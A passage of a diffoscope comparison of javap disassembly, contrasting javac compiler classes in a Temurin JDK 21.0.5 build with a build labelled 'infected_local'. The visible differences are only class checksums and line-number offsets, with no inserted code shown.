+│ │ │ │ │ │ │ │ │ │         361: aload_1
+│ │ │ │ │ │ │ │ │ │         362: invokespecial #176                // Method com/sun/tools/javac/tree/TreeTranslator.visitClassDef:(Lcom/sun/tools/javac/tree/JCTree$JCClassDecl;)V
+│ │ │ │ │ │ │ │ │ │         365: return
+│ │ │ │ │ │ │ │ │ │        LineNumberTable:
+│ │ │ │ │ │ │ │ │ │ -        line 1767: 0
+│ │ │ │ │ │ │ │ │ │ -        line 1768: 8
+│ │ │ │ │ │ │ │ │ │ -        line 1769: 20
+│ │ │ │ │ │ │ │ │ │ -        line 1770: 29
+│ │ │ │ │ │ │ │ │ │ -        line 1772: 68
+│ │ │ │ │ │ │ │ │ │ -        line 1774: 123
+│ │ │ │ │ │ │ │ │ │ -        line 1775: 142
+│ │ │ │ │ │ │ │ │ │ -        line 1778: 152
+│ │ │ │ │ │ │ │ │ │ -        line 1781: 231
+│ │ │ │ │ │ │ │ │ │ -        line 1782: 250
+│ │ │ │ │ │ │ │ │ │ -        line 1785: 260
+│ │ │ │ │ │ │ │ │ │ -        line 1786: 315
+│ │ │ │ │ │ │ │ │ │ -        line 1787: 334
+│ │ │ │ │ │ │ │ │ │ -        line 1768: 344
+│ │ │ │ │ │ │ │ │ │ -        line 1793: 352
+│ │ │ │ │ │ │ │ │ │ -        line 1794: 360
+│ │ │ │ │ │ │ │ │ │ -        line 1795: 365
+│ │ │ │ │ │ │ │ │ │ +        line 1841: 0
+│ │ │ │ │ │ │ │ │ │ +        line 1842: 8
+│ │ │ │ │ │ │ │ │ │ +        line 1843: 20
+│ │ │ │ │ │ │ │ │ │ +        line 1844: 29
+│ │ │ │ │ │ │ │ │ │ +        line 1846: 68
+│ │ │ │ │ │ │ │ │ │ +        line 1848: 123
+│ │ │ │ │ │ │ │ │ │ +        line 1849: 142
+│ │ │ │ │ │ │ │ │ │ +        line 1852: 152
+│ │ │ │ │ │ │ │ │ │ +        line 1855: 231
+│ │ │ │ │ │ │ │ │ │ +        line 1856: 250
+│ │ │ │ │ │ │ │ │ │ +        line 1859: 260
+│ │ │ │ │ │ │ │ │ │ +        line 1860: 315
+│ │ │ │ │ │ │ │ │ │ +        line 1861: 334
+│ │ │ │ │ │ │ │ │ │ +        line 1842: 344
+│ │ │ │ │ │ │ │ │ │ +        line 1867: 352
+│ │ │ │ │ │ │ │ │ │ +        line 1868: 360
+│ │ │ │ │ │ │ │ │ │ +        line 1869: 365
+│ │ │ │ │ │ │ │ │ │        LocalVariableTable:
+│ │ │ │ │ │ │ │ │ │          Start  Length  Slot  Name   Signature
+│ │ │ │ │ │ │ │ │ │             29     315     4     t   Lcom/sun/tools/javac/tree/JCTree;
+│ │ │ │ │ │ │ │ │ │             13     339     3    it   Lcom/sun/tools/javac/util/List;
+│ │ │ │ │ │ │ │ │ │              0     366     0  this   Lcom/sun/tools/javac/main/JavaCompiler$1MethodBodyRemover;
+│ │ │ │ │ │ │ │ │ │              0     366     1  tree   Lcom/sun/tools/javac/tree/JCTree$JCClassDecl;
+│ │ │ │ │ │ │ │ │ │              8     358     2 newdefs   Lcom/sun/tools/javac/util/ListBuffer;
+│ │ │ │ │ │ │ │ │   --- stage2_21.0.5-tem/lib/modules_extracted/jdk.compiler/com/sun/tools/javac/main/JavaCompiler$1ScanNested.class
+│ │ │ │ │ │ │ │ ├── +++ stage2_21.0.5-infected_local/lib/modules_extracted/jdk.compiler/com/sun/tools/javac/main/JavaCompiler$1ScanNested.class
+│ │ │ │ │ │ │ │ │ ├── javap -verbose -constants -s -l -private {}
+│ │ │ │ │ │ │ │ │ │ @@ -1,8 +1,8 @@
+│ │ │ │ │ │ │ │ │ │ -  SHA-256 checksum 1491be2b30020ebc22ee7e3473c86a86c1fd28ba46cf4943f1222ae17603ca8e
+│ │ │ │ │ │ │ │ │ │ +  SHA-256 checksum 25c866b0eca758b9b6160b7b265ebf0dd53b00152b6e51d8e7f0e8508cb8a18c
+│ │ │ │ │ │ │ │ │ │    Compiled from "JavaCompiler.java"
+│ │ │ │ │ │ │ │ │ │  class com.sun.tools.javac.main.JavaCompiler$1ScanNested extends com.sun.tools.javac.tree.TreeScanner
+│ │ │ │ │ │ │ │ │ │    minor version: 0
+│ │ │ │ │ │ │ │ │ │    major version: 65
+│ │ │ │ │ │ │ │ │ │    flags: (0x0020) ACC_SUPER
+│ │ │ │ │ │ │ │ │ │    this_class: #2                          // com/sun/tools/javac/main/JavaCompiler$1ScanNested
+│ │ │ │ │ │ │ │ │ │    super_class: #12                        // com/sun/tools/javac/tree/TreeScanner
+│ │ │ │ │ │ │ │ │ │ @@ -243,16 +243,16 @@
+│ │ │ │ │ │ │ │ │ │          14: aload_0
+│ │ │ │ │ │ │ │ │ │          15: new           #17                 // class java/util/LinkedHashSet
+│ │ │ │ │ │ │ │ │ │          18: dup
+│ │ │ │ │ │ │ │ │ │          19: invokespecial #19                 // Method java/util/LinkedHashSet."<init>":()V
+│ │ │ │ │ │ │ │ │ │          22: putfield      #20                 // Field dependencies:Ljava/util/Set;
+│ │ │ │ │ │ │ │ │ │          25: return
+│ │ │ │ │ │ │ │ │ │        LineNumberTable:
+│ │ │ │ │ │ │ │ │ │ -        line 1506: 0
+│ │ │ │ │ │ │ │ │ │ -        line 1507: 14
+│ │ │ │ │ │ │ │ │ │ +        line 1580: 0
+│ │ │ │ │ │ │ │ │ │ +        line 1581: 14
+│ │ │ │ │ │ │ │ │ │        LocalVariableTable:
+│ │ │ │ │ │ │ │ │ │          Start  Length  Slot  Name   Signature
+│ │ │ │ │ │ │ │ │ │              0      26     0  this   Lcom/sun/tools/javac/main/JavaCompiler$1ScanNested;
+│ │ │ │ │ │ │ │ │ │              0      26     1 this$0   Lcom/sun/tools/javac/main/JavaCompiler;
+│ │ │ │ │ │ │ │ │ │      MethodParameters:
+│ │ │ │ │ │ │ │ │ │        Name                           Flags
+│ │ │ │ │ │ │ │ │ │        <no name>                      final mandated
+│ │ │ │ │ │ │ │ │ │ @@ -341,35 +341,35 @@
+│ │ │ │ │ │ │ │ │ │         157: invokespecial #103                // Method com/sun/tools/javac/tree/TreeScanner.visitClassDef:(Lcom/sun/tools/javac/tree/JCTree$JCClassDecl;)V
+│ │ │ │ │ │ │ │ │ │         160: return
+│ │ │ │ │ │ │ │ │ │        Exception table:
+│ │ │ │ │ │ │ │ │ │           from    to  target type
+│ │ │ │ │ │ │ │ │ │              97   106   121   any
+│ │ │ │ │ │ │ │ │ │             121   123   121   any
+│ │ │ │ │ │ │ │ │ │        LineNumberTable:
+│ │ │ │ │ │ │ │ │ │ -        line 1512: 0
+│ │ │ │ │ │ │ │ │ │ -        line 1513: 18
+│ │ │ │ │ │ │ │ │ │ -        line 1514: 20
+│ │ │ │ │ │ │ │ │ │ -        line 1515: 34
+│ │ │ │ │ │ │ │ │ │ -        line 1516: 43
+│ │ │ │ │ │ │ │ │ │ -        line 1517: 57
+│ │ │ │ │ │ │ │ │ │ -        line 1518: 71
+│ │ │ │ │ │ │ │ │ │ -        line 1519: 85
+│ │ │ │ │ │ │ │ │ │ -        line 1520: 91
+│ │ │ │ │ │ │ │ │ │ -        line 1522: 97
+│ │ │ │ │ │ │ │ │ │ -        line 1531: 106
+│ │ │ │ │ │ │ │ │ │ -        line 1532: 112
+│ │ │ │ │ │ │ │ │ │ -        line 1533: 118
+│ │ │ │ │ │ │ │ │ │ -        line 1531: 121
+│ │ │ │ │ │ │ │ │ │ -        line 1532: 129
+│ │ │ │ │ │ │ │ │ │ -        line 1533: 135
+│ │ │ │ │ │ │ │ │ │ -        line 1535: 138
+│ │ │ │ │ │ │ │ │ │ -        line 1537: 140
+│ │ │ │ │ │ │ │ │ │ -        line 1538: 152
+│ │ │ │ │ │ │ │ │ │ -        line 1539: 155
+│ │ │ │ │ │ │ │ │ │ -        line 1540: 160
+│ │ │ │ │ │ │ │ │ │ +        line 1586: 0
+│ │ │ │ │ │ │ │ │ │ +        line 1587: 18
+│ │ │ │ │ │ │ │ │ │ +        line 1588: 20
+│ │ │ │ │ │ │ │ │ │ +        line 1589: 34
+│ │ │ │ │ │ │ │ │ │ +        line 1590: 43
+│ │ │ │ │ │ │ │ │ │ +        line 1591: 57
+│ │ │ │ │ │ │ │ │ │ +        line 1592: 71
+│ │ │ │ │ │ │ │ │ │ +        line 1593: 85
+│ │ │ │ │ │ │ │ │ │ +        line 1594: 91
+│ │ │ │ │ │ │ │ │ │ +        line 1596: 97
+│ │ │ │ │ │ │ │ │ │ +        line 1605: 106
+│ │ │ │ │ │ │ │ │ │ +        line 1606: 112
+│ │ │ │ │ │ │ │ │ │ +        line 1607: 118
+│ │ │ │ │ │ │ │ │ │ +        line 1605: 121
+│ │ │ │ │ │ │ │ │ │ +        line 1606: 129
+│ │ │ │ │ │ │ │ │ │ +        line 1607: 135
+│ │ │ │ │ │ │ │ │ │ +        line 1609: 138
+│ │ │ │ │ │ │ │ │ │ +        line 1611: 140
+│ │ │ │ │ │ │ │ │ │ +        line 1612: 152
+│ │ │ │ │ │ │ │ │ │ +        line 1613: 155
+│ │ │ │ │ │ │ │ │ │ +        line 1614: 160
+│ │ │ │ │ │ │ │ │ │        LocalVariableTable:
+│ │ │ │ │ │ │ │ │ │          Start  Length  Slot  Name   Signature
+│ │ │ │ │ │ │ │ │ │             91      47     6 prevHasLambdas   Z
+│ │ │ │ │ │ │ │ │ │             97      41     7 prevHasPatterns   Z
+│ │ │ │ │ │ │ │ │ │             43     109     4     c   Lcom/sun/tools/javac/code/Symbol$ClassSymbol;
+│ │ │ │ │ │ │ │ │ │             57      95     5 stEnv   Lcom/sun/tools/javac/comp/Env;
+│ │ │ │ │ │ │ │ │ │              0     161     0  this   Lcom/sun/tools/javac/main/JavaCompiler$1ScanNested;
+│ │ │ │ │ │ │ │ │ │ @@ -402,17 +402,17 @@
+│ │ │ │ │ │ │ │ │ │           1: iconst_1
+│ │ │ │ │ │ │ │ │ │           2: putfield      #86                 // Field hasLambdas:Z
+│ │ │ │ │ │ │ │ │ │           5: aload_0
+│ │ │ │ │ │ │ │ │ │           6: aload_1
+│ │ │ │ │ │ │ │ │ │           7: invokespecial #107                // Method com/sun/tools/javac/tree/TreeScanner.visitLambda:(Lcom/sun/tools/javac/tree/JCTree$JCLambda;)V
+│ │ │ │ │ │ │ │ │ │          10: return
+│ │ │ │ │ │ │ │ │ │        LineNumberTable:
+│ │ │ │ │ │ │ │ │ │ -        line 1543: 0
+│ │ │ │ │ │ │ │ │ │ -        line 1544: 5
+│ │ │ │ │ │ │ │ │ │ -        line 1545: 10
+│ │ │ │ │ │ │ │ │ │ +        line 1617: 0
+│ │ │ │ │ │ │ │ │ │ +        line 1618: 5
+│ │ │ │ │ │ │ │ │ │ +        line 1619: 10
+│ │ │ │ │ │ │ │ │ │        LocalVariableTable:
+│ │ │ │ │ │ │ │ │ │          Start  Length  Slot  Name   Signature
+│ │ │ │ │ │ │ │ │ │              0      11     0  this   Lcom/sun/tools/javac/main/JavaCompiler$1ScanNested;
+│ │ │ │ │ │ │ │ │ │              0      11     1  tree   Lcom/sun/tools/javac/tree/JCTree$JCLambda;
+│ │ │ │ │ │ │ │ │ │  
+│ │ │ │ │ │ │ │ │ │    public void visitReference(com.sun.tools.javac.tree.JCTree$JCMemberReference);
+│ │ │ │ │ │ │ │ │ │      descriptor: (Lcom/sun/tools/javac/tree/JCTree$JCMemberReference;)V
+│ │ │ │ │ │ │ │ │ │ @@ -423,17 +423,17 @@
+│ │ │ │ │ │ │ │ │ │           1: iconst_1
+│ │ │ │ │ │ │ │ │ │           2: putfield      #86                 // Field hasLambdas:Z
+│ │ │ │ │ │ │ │ │ │           5: aload_0
+│ │ │ │ │ │ │ │ │ │           6: aload_1
+│ │ │ │ │ │ │ │ │ │           7: invokespecial #111                // Method com/sun/tools/javac/tree/TreeScanner.visitReference:(Lcom/sun/tools/javac/tree/JCTree$JCMemberReference;)V
+│ │ │ │ │ │ │ │ │ │          10: return
+│ │ │ │ │ │ │ │ │ │        LineNumberTable:
+│ │ │ │ │ │ │ │ │ │ -        line 1548: 0
+│ │ │ │ │ │ │ │ │ │ -        line 1549: 5
+│ │ │ │ │ │ │ │ │ │ -        line 1550: 10
+│ │ │ │ │ │ │ │ │ │ +        line 1622: 0
+│ │ │ │ │ │ │ │ │ │ +        line 1623: 5
+│ │ │ │ │ │ │ │ │ │ +        line 1624: 10
+│ │ │ │ │ │ │ │ │ │        LocalVariableTable:
+│ │ │ │ │ │ │ │ │ │          Start  Length  Slot  Name   Signature
+│ │ │ │ │ │ │ │ │ │              0      11     0  this   Lcom/sun/tools/javac/main/JavaCompiler$1ScanNested;
+│ │ │ │ │ │ │ │ │ │              0      11     1  tree   Lcom/sun/tools/javac/tree/JCTree$JCMemberReference;
+│ │ │ │ │ │ │ │ │ │  
+│ │ │ │ │ │ │ │ │ │    public void visitBindingPattern(com.sun.tools.javac.tree.JCTree$JCBindingPattern);
+│ │ │ │ │ │ │ │ │ │      descriptor: (Lcom/sun/tools/javac/tree/JCTree$JCBindingPattern;)V
+│ │ │ │ │ │ │ │ │ │ @@ -444,17 +444,17 @@
+│ │ │ │ │ │ │ │ │ │           1: iconst_1
+│ │ │ │ │ │ │ │ │ │           2: putfield      #90                 // Field hasPatterns:Z
+│ │ │ │ │ │ │ │ │ │           5: aload_0
+│ │ │ │ │ │ │ │ │ │           6: aload_1
+│ │ │ │ │ │ │ │ │ │           7: invokespecial #115                // Method com/sun/tools/javac/tree/TreeScanner.visitBindingPattern:(Lcom/sun/tools/javac/tree/JCTree$JCBindingPattern;)V
+│ │ │ │ │ │ │ │ │ │          10: return
+│ │ │ │ │ │ │ │ │ │        LineNumberTable:
+│ │ │ │ │ │ │ │ │ │ -        line 1553: 0
+│ │ │ │ │ │ │ │ │ │ -        line 1554: 5
+│ │ │ │ │ │ │ │ │ │ -        line 1555: 10
+│ │ │ │ │ │ │ │ │ │ +        line 1627: 0
+│ │ │ │ │ │ │ │ │ │ +        line 1628: 5
+│ │ │ │ │ │ │ │ │ │ +        line 1629: 10
+│ │ │ │ │ │ │ │ │ │        LocalVariableTable:
+│ │ │ │ │ │ │ │ │ │          Start  Length  Slot  Name   Signature
+│ │ │ │ │ │ │ │ │ │              0      11     0  this   Lcom/sun/tools/javac/main/JavaCompiler$1ScanNested;
+│ │ │ │ │ │ │ │ │ │              0      11     1  tree   Lcom/sun/tools/javac/tree/JCTree$JCBindingPattern;
+│ │ │ │ │ │ │ │ │ │  
+│ │ │ │ │ │ │ │ │ │    public void visitRecordPattern(com.sun.tools.javac.tree.JCTree$JCRecordPattern);
+│ │ │ │ │ │ │ │ │ │      descriptor: (Lcom/sun/tools/javac/tree/JCTree$JCRecordPattern;)V
+│ │ │ │ │ │ │ │ │ │ @@ -465,17 +465,17 @@
+│ │ │ │ │ │ │ │ │ │           1: iconst_1
+│ │ │ │ │ │ │ │ │ │           2: putfield      #90                 // Field hasPatterns:Z
+│ │ │ │ │ │ │ │ │ │           5: aload_0
+│ │ │ │ │ │ │ │ │ │           6: aload_1
+│ │ │ │ │ │ │ │ │ │           7: invokespecial #119                // Method com/sun/tools/javac/tree/TreeScanner.visitRecordPattern:(Lcom/sun/tools/javac/tree/JCTree$JCRecordPattern;)V
+│ │ │ │ │ │ │ │ │ │          10: return
+│ │ │ │ │ │ │ │ │ │        LineNumberTable:
+│ │ │ │ │ │ │ │ │ │ -        line 1558: 0
+│ │ │ │ │ │ │ │ │ │ -        line 1559: 5
+│ │ │ │ │ │ │ │ │ │ -        line 1560: 10
+│ │ │ │ │ │ │ │ │ │ +        line 1632: 0
+│ │ │ │ │ │ │ │ │ │ +        line 1633: 5
+│ │ │ │ │ │ │ │ │ │ +        line 1634: 10
+│ │ │ │ │ │ │ │ │ │        LocalVariableTable:
+│ │ │ │ │ │ │ │ │ │          Start  Length  Slot  Name   Signature
+│ │ │ │ │ │ │ │ │ │              0      11     0  this   Lcom/sun/tools/javac/main/JavaCompiler$1ScanNested;
+│ │ │ │ │ │ │ │ │ │              0      11     1  that   Lcom/sun/tools/javac/tree/JCTree$JCRecordPattern;
+│ │ │ │ │ │ │ │ │ │  
+│ │ │ │ │ │ │ │ │ │    public void visitSwitch(com.sun.tools.javac.tree.JCTree$JCSwitch);
+│ │ │ │ │ │ │ │ │ │      descriptor: (Lcom/sun/tools/javac/tree/JCTree$JCSwitch;)V
+│ │ │ │ │ │ │ │ │ │ @@ -490,17 +490,17 @@
+│ │ │ │ │ │ │ │ │ │           9: ior
+│ │ │ │ │ │ │ │ │ │          10: putfield      #90                 // Field hasPatterns:Z
+│ │ │ │ │ │ │ │ │ │          13: aload_0
+│ │ │ │ │ │ │ │ │ │          14: aload_1
+│ │ │ │ │ │ │ │ │ │          15: invokespecial #128                // Method com/sun/tools/javac/tree/TreeScanner.visitSwitch:(Lcom/sun/tools/javac/tree/JCTree$JCSwitch;)V
+│ │ │ │ │ │ │ │ │ │          18: return
+│ │ │ │ │ │ │ │ │ │        LineNumberTable:
+│ │ │ │ │ │ │ │ │ │ -        line 1563: 0
+│ │ │ │ │ │ │ │ │ │ -        line 1564: 13
+│ │ │ │ │ │ │ │ │ │ -        line 1565: 18
+│ │ │ │ │ │ │ │ │ │ +        line 1637: 0
+│ │ │ │ │ │ │ │ │ │ +        line 1638: 13
+│ │ │ │ │ │ │ │ │ │ +        line 1639: 18
+│ │ │ │ │ │ │ │ │ │        LocalVariableTable:
+│ │ │ │ │ │ │ │ │ │          Start  Length  Slot  Name   Signature
+│ │ │ │ │ │ │ │ │ │              0      19     0  this   Lcom/sun/tools/javac/main/JavaCompiler$1ScanNested;
+│ │ │ │ │ │ │ │ │ │              0      19     1  tree   Lcom/sun/tools/javac/tree/JCTree$JCSwitch;
+│ │ │ │ │ │ │ │ │ │  
+│ │ │ │ │ │ │ │ │ │    public void visitSwitchExpression(com.sun.tools.javac.tree.JCTree$JCSwitchExpression);
+│ │ │ │ │ │ │ │ │ │      descriptor: (Lcom/sun/tools/javac/tree/JCTree$JCSwitchExpression;)V
+│ │ │ │ │ │ │ │ │ │ @@ -515,17 +515,17 @@
+│ │ │ │ │ │ │ │ │ │           9: ior
+│ │ │ │ │ │ │ │ │ │          10: putfield      #90                 // Field hasPatterns:Z
+│ │ │ │ │ │ │ │ │ │          13: aload_0
+│ │ │ │ │ │ │ │ │ │          14: aload_1
+│ │ │ │ │ │ │ │ │ │          15: invokespecial #135                // Method com/sun/tools/javac/tree/TreeScanner.visitSwitchExpression:(Lcom/sun/tools/javac/tree/JCTree$JCSwitchExpression;)V
+│ │ │ │ │ │ │ │ │ │          18: return
+│ │ │ │ │ │ │ │ │ │        LineNumberTable:
+│ │ │ │ │ │ │ │ │ │ -        line 1568: 0
+│ │ │ │ │ │ │ │ │ │ -        line 1569: 13
+│ │ │ │ │ │ │ │ │ │ -        line 1570: 18
+│ │ │ │ │ │ │ │ │ │ +        line 1642: 0
+│ │ │ │ │ │ │ │ │ │ +        line 1643: 13
+│ │ │ │ │ │ │ │ │ │ +        line 1644: 18
+│ │ │ │ │ │ │ │ │ │        LocalVariableTable:
+│ │ │ │ │ │ │ │ │ │          Start  Length  Slot  Name   Signature
+│ │ │ │ │ │ │ │ │ │              0      19     0  this   Lcom/sun/tools/javac/main/JavaCompiler$1ScanNested;
+│ │ │ │ │ │ │ │ │ │              0      19     1  tree   Lcom/sun/tools/javac/tree/JCTree$JCSwitchExpression;
+│ │ │ │ │ │ │ │ │ │  }
+│ │ │ │ │ │ │ │ │ │  SourceFile: "JavaCompiler.java"
+│ │ │ │ │ │ │ │ │ │  EnclosingMethod: #25.#171               // com.sun.tools.javac.main.JavaCompiler.desugar
+│ │ │ │ │ │ │ │ │   --- stage2_21.0.5-tem/lib/modules_extracted/jdk.compiler/com/sun/tools/javac/main/JavaCompiler$2.class
+│ │ │ │ │ │ │ │ ├── +++ stage2_21.0.5-infected_local/lib/modules_extracted/jdk.compiler/com/sun/tools/javac/main/JavaCompiler$2.class
+│ │ │ │ │ │ │ │ │ ├── javap -verbose -constants -s -l -private {}
+│ │ │ │ │ │ │ │ │ │ @@ -1,8 +1,8 @@
+│ │ │ │ │ │ │ │ │ │ -  SHA-256 checksum d409349ec021c3f2dfab8f0ced10284b2e1f62f5003b3940cfa417ae33abc10f
+│ │ │ │ │ │ │ │ │ │ +  SHA-256 checksum b597e85ca096a42f05eb4be7e68f6c606f5b0368c25f974f1f8b2bf6848777a6
+│ │ │ │ │ │ │ │ │ │    Compiled from "JavaCompiler.java"
+│ │ │ │ │ │ │ │ │ │  class com.sun.tools.javac.main.JavaCompiler$2
+│ │ │ │ │ │ │ │ │ │    minor version: 0
+│ │ │ │ │ │ │ │ │ │    major version: 65
+│ │ │ │ │ │ │ │ │ │    flags: (0x1020) ACC_SUPER, ACC_SYNTHETIC
+│ │ │ │ │ │ │ │ │ │    this_class: #8                          // com/sun/tools/javac/main/JavaCompiler$2
+│ │ │ │ │ │ │ │ │ │    super_class: #29                        // java/lang/Object
+│ │ │ │ │ │ │ │ │ │ @@ -92,15 +92,15 @@
+│ │ │ │ │ │ │ │ │ │          54: return
+│ │ │ │ │ │ │ │ │ │        Exception table:
+│ │ │ │ │ │ │ │ │ │           from    to  target type
+│ │ │ │ │ │ │ │ │ │               9    20    23   Class java/lang/NoSuchFieldError
+│ │ │ │ │ │ │ │ │ │              24    35    38   Class java/lang/NoSuchFieldError
+│ │ │ │ │ │ │ │ │ │              39    50    53   Class java/lang/NoSuchFieldError
+│ │ │ │ │ │ │ │ │ │        LineNumberTable:
+│ │ │ │ │ │ │ │ │ │ -        line 1770: 0
+│ │ │ │ │ │ │ │ │ │ +        line 1844: 0
+│ │ │ │ │ │ │ │ │ │        LocalVariableTable:
+│ │ │ │ │ │ │ │ │ │          Start  Length  Slot  Name   Signature
+│ │ │ │ │ │ │ │ │ │        StackMapTable: number_of_entries = 6
+│ │ │ │ │ │ │ │ │ │          frame_type = 87 /* same_locals_1_stack_item */
+│ │ │ │ │ │ │ │ │ │            stack = [ class java/lang/NoSuchFieldError ]
+│ │ │ │ │ │ │ │ │ │          frame_type = 0 /* same */
+│ │ │ │ │ │ │ │ │ │          frame_type = 77 /* same_locals_1_stack_item */
+│ │ │ │ │ │ │ │ │   --- stage2_21.0.5-tem/lib/modules_extracted/jdk.compiler/com/sun/tools/javac/main/JavaCompiler$InitialFileParser.class
+│ │ │ │ │ │ │ │ ├── +++ stage2_21.0.5-infected_local/lib/modules_extracted/jdk.compiler/com/sun/tools/javac/main/JavaCompiler$InitialFileParser.class
+│ │ │ │ │ │ │ │ │ ├── javap -verbose -constants -s -l -private {}
+│ │ │ │ │ │ │ │ │ │ @@ -1,8 +1,8 @@
+│ │ │ │ │ │ │ │ │ │ -  SHA-256 checksum 14f4bdce53157657e9b05e6e0188e3db9f43817d6cc7bd188004df44e4886265
+│ │ │ │ │ │ │ │ │ │ +  SHA-256 checksum a0f0d04aa4058014011087c4792115c7aa378c2636311de8b6d2d1deb50d94e8
+│ │ │ │ │ │ │ │ │ │    Compiled from "JavaCompiler.java"
+│ │ │ │ │ │ │ │ │ │  public class com.sun.tools.javac.main.JavaCompiler$InitialFileParser implements com.sun.tools.javac.main.JavaCompiler$InitialFileParserIntf
+│ │ │ │ │ │ │ │ │ │    minor version: 0
+│ │ │ │ │ │ │ │ │ │    major version: 65
+│ │ │ │ │ │ │ │ │ │    flags: (0x0021) ACC_PUBLIC, ACC_SUPER
+│ │ │ │ │ │ │ │ │ │    this_class: #2                          // com/sun/tools/javac/main/JavaCompiler$InitialFileParser
+│ │ │ │ │ │ │ │ │ │    super_class: #20                        // java/lang/Object
+│ │ │ │ │ │ │ │ │ │ @@ -110,18 +110,18 @@
+│ │ │ │ │ │ │ │ │ │          18: dup
+│ │ │ │ │ │ │ │ │ │          19: aload_0
+│ │ │ │ │ │ │ │ │ │          20: invokespecial #15                 // Method "<init>":(Lcom/sun/tools/javac/util/Context;)V
+│ │ │ │ │ │ │ │ │ │          23: astore_1
+│ │ │ │ │ │ │ │ │ │          24: aload_1
+│ │ │ │ │ │ │ │ │ │          25: areturn
+│ │ │ │ │ │ │ │ │ │        LineNumberTable:
+│ │ │ │ │ │ │ │ │ │ -        line 1958: 0
+│ │ │ │ │ │ │ │ │ │ -        line 1959: 11
+│ │ │ │ │ │ │ │ │ │ -        line 1960: 15
+│ │ │ │ │ │ │ │ │ │ -        line 1961: 24
+│ │ │ │ │ │ │ │ │ │ +        line 2032: 0
+│ │ │ │ │ │ │ │ │ │ +        line 2033: 11
+│ │ │ │ │ │ │ │ │ │ +        line 2034: 15
+│ │ │ │ │ │ │ │ │ │ +        line 2035: 24
+│ │ │ │ │ │ │ │ │ │        LocalVariableTable:
+│ │ │ │ │ │ │ │ │ │          Start  Length  Slot  Name   Signature
+│ │ │ │ │ │ │ │ │ │              0      26     0 context   Lcom/sun/tools/javac/util/Context;
+│ │ │ │ │ │ │ │ │ │             11      15     1 instance   Lcom/sun/tools/javac/main/JavaCompiler$InitialFileParserIntf;
+│ │ │ │ │ │ │ │ │ │        StackMapTable: number_of_entries = 1
+│ │ │ │ │ │ │ │ │ │          frame_type = 252 /* append */
+│ │ │ │ │ │ │ │ │ │            offset_delta = 24
+│ │ │ │ │ │ │ │ │ │ @@ -140,18 +140,18 @@
+│ │ │ │ │ │ │ │ │ │           9: invokevirtual #24                 // Method com/sun/tools/javac/util/Context.put:(Lcom/sun/tools/javac/util/Context$Key;Ljava/lang/Object;)V
+│ │ │ │ │ │ │ │ │ │          12: aload_0
+│ │ │ │ │ │ │ │ │ │          13: aload_1
+│ │ │ │ │ │ │ │ │ │          14: invokestatic  #28                 // Method com/sun/tools/javac/main/JavaCompiler.instance:(Lcom/sun/tools/javac/util/Context;)Lcom/sun/tools/javac/main/JavaCompiler;
+│ │ │ │ │ │ │ │ │ │          17: putfield      #34                 // Field compiler:Lcom/sun/tools/javac/main/JavaCompiler;
+│ │ │ │ │ │ │ │ │ │          20: return
+│ │ │ │ │ │ │ │ │ │        LineNumberTable:
+│ │ │ │ │ │ │ │ │ │ -        line 1966: 0
+│ │ │ │ │ │ │ │ │ │ -        line 1967: 4
+│ │ │ │ │ │ │ │ │ │ -        line 1968: 12
+│ │ │ │ │ │ │ │ │ │ -        line 1969: 20
+│ │ │ │ │ │ │ │ │ │ +        line 2040: 0
+│ │ │ │ │ │ │ │ │ │ +        line 2041: 4
+│ │ │ │ │ │ │ │ │ │ +        line 2042: 12
+│ │ │ │ │ │ │ │ │ │ +        line 2043: 20
+│ │ │ │ │ │ │ │ │ │        LocalVariableTable:
+│ │ │ │ │ │ │ │ │ │          Start  Length  Slot  Name   Signature
+│ │ │ │ │ │ │ │ │ │              0      21     0  this   Lcom/sun/tools/javac/main/JavaCompiler$InitialFileParser;
+│ │ │ │ │ │ │ │ │ │              0      21     1 context   Lcom/sun/tools/javac/util/Context;
+│ │ │ │ │ │ │ │ │ │  
+│ │ │ │ │ │ │ │ │ │    public com.sun.tools.javac.util.List<com.sun.tools.javac.tree.JCTree$JCCompilationUnit> parse(java.lang.Iterable<javax.tools.JavaFileObject>);
+│ │ │ │ │ │ │ │ │ │      descriptor: (Ljava/lang/Iterable;)Lcom/sun/tools/javac/util/List;
+│ │ │ │ │ │ │ │ │ │ @@ -161,15 +161,15 @@
+│ │ │ │ │ │ │ │ │ │           0: aload_0
+│ │ │ │ │ │ │ │ │ │           1: getfield      #34                 // Field compiler:Lcom/sun/tools/javac/main/JavaCompiler;
+│ │ │ │ │ │ │ │ │ │           4: aload_1
+│ │ │ │ │ │ │ │ │ │           5: iconst_0
+│ │ │ │ │ │ │ │ │ │           6: invokevirtual #38                 // Method com/sun/tools/javac/main/JavaCompiler.parseFiles:(Ljava/lang/Iterable;Z)Lcom/sun/tools/javac/util/List;
+│ │ │ │ │ │ │ │ │ │           9: areturn
+│ │ │ │ │ │ │ │ │ │        LineNumberTable:
+│ │ │ │ │ │ │ │ │ │ -        line 1973: 0
+│ │ │ │ │ │ │ │ │ │ +        line 2047: 0
+│ │ │ │ │ │ │ │ │ │        LocalVariableTable:
+│ │ │ │ │ │ │ │ │ │          Start  Length  Slot  Name   Signature
+│ │ │ │ │ │ │ │ │ │              0      10     0  this   Lcom/sun/tools/javac/main/JavaCompiler$InitialFileParser;
+│ │ │ │ │ │ │ │ │ │              0      10     1 fileObjects   Ljava/lang/Iterable;
+│ │ │ │ │ │ │ │ │ │        LocalVariableTypeTable:
+│ │ │ │ │ │ │ │ │ │          Start  Length  Slot  Name   Signature
+│ │ │ │ │ │ │ │ │ │              0      10     1 fileObjects   Ljava/lang/Iterable<Ljavax/tools/JavaFileObject;>;
+│ │ │ │ │ │ │ │ │ │ @@ -182,15 +182,15 @@
+│ │ │ │ │ │ │ │ │ │        stack=2, locals=0, args_size=0
+│ │ │ │ │ │ │ │ │ │           0: new           #42                 // class com/sun/tools/javac/util/Context$Key
+│ │ │ │ │ │ │ │ │ │           3: dup
+│ │ │ │ │ │ │ │ │ │           4: invokespecial #44                 // Method com/sun/tools/javac/util/Context$Key."<init>":()V
+│ │ │ │ │ │ │ │ │ │           7: putstatic     #1                  // Field initialParserKey:Lcom/sun/tools/javac/util/Context$Key;
+│ │ │ │ │ │ │ │ │ │          10: return
+│ │ │ │ │ │ │ │ │ │        LineNumberTable:
+│ │ │ │ │ │ │ │ │ │ -        line 1955: 0
+│ │ │ │ │ │ │ │ │ │ +        line 2029: 0
+│ │ │ │ │ │ │ │ │ │  }
+│ │ │ │ │ │ │ │ │ │  SourceFile: "JavaCompiler.java"
+│ │ │ │ │ │ │ │ │ │  NestHost: class com/sun/tools/javac/main/JavaCompiler
+│ │ │ │ │ │ │ │ │ │  InnerClasses:
